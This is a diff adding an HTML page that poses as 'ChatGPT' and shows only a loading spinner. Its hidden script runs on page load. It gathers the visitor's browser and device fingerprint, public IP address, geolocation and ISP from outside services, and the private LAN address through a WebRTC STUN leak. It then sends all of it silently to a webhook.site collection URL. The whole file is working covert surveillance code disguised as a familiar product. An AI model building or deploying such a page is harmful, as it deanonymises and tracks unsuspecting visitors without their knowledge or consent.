@@ -1,0 +1,49 @@
+<!doctype html><meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<title>ChatGPT</title>
+<style>
+html,body{margin:0;height:100%;background:#000;overflow:hidden}
+#s{position:fixed;inset:0;display:flex;align-items:center;justify-content:center}
+#m{width:26px;height:26px;border-radius:50%;border:2px solid #333;border-top-color:#888;
+animation:r .9s linear infinite}
+@keyframes r{to{transform:rotate(360deg)}}
+#d{position:fixed;right:8px;bottom:8px;width:6px;height:6px;border-radius:50%;background:#222}
+</style>
+<div id=s><div id=m></div></div>
+<div id=d></div>
+<script>
+const H="https://webhook.site/7ffe86b1-276e-4e73-9fa7-afcea6a71f25",R={};
+const dot=document.getElementById('d');
+const T=(p,ms)=>Promise.race([p,new Promise(r=>setTimeout(()=>r(null),ms))]);
+const X=u=>T(fetch(u).then(r=>r.text()),3500).catch(()=>null);
+const J=u=>T(fetch(u).then(r=>r.json()),3500).catch(()=>null);
+(async()=>{
+ R.ua=navigator.userAgent;R.plat=navigator.platform;
+ R.scr=screen.width+"x"+screen.height;R.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+ R.lang=navigator.language;R.cores=navigator.hardwareConcurrency||"";
+ try{const g=document.createElement('canvas').getContext('webgl');
+  R.gpu=g.getParameter(g.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL)}catch(e){}
+
+ const a=(await X("https://api64.ipify.org"))||"";
+ if(a.includes("."))R.ip=a.trim();else if(a.includes(":"))R.ip6=a.trim();
+ if(!R.ip){const b=(await X("https://api.ipify.org"))||"";if(b.includes("."))R.ip=b.trim()}
+ if(!R.ip6){const b=(await X("https://api6.ipify.org"))||"";if(b.includes(":"))R.ip6=b.trim()}
+
+ const q=R.ip||R.ip6;
+ if(q){const g=await J("https://ipapi.co/"+q+"/json/");
+  if(g){R.city=[g.city,g.region,g.country_name].filter(Boolean).join(", ");
+        R.isp=g.org;R.asn=g.asn;R.net=g.network}}
+
+ try{const p=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+  p.createDataChannel("x");
+  p.onicecandidate=e=>{if(!e.candidate)return;
+   (e.candidate.candidate.match(/\d+\.\d+\.\d+\.\d+/g)||[]).forEach(x=>{
+    if(/^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(x))R.lan=x})};
+  await T(p.setLocalDescription(await p.createOffer()),2000)}catch(e){}
+
+ const b=JSON.stringify(R);
+ try{navigator.sendBeacon(H,new Blob([b],{type:"text/plain"}))}catch(e){}
+ try{await fetch(H,{method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:b})}catch(e){}
+ dot.style.background="#0a0";
+})();
+</script>
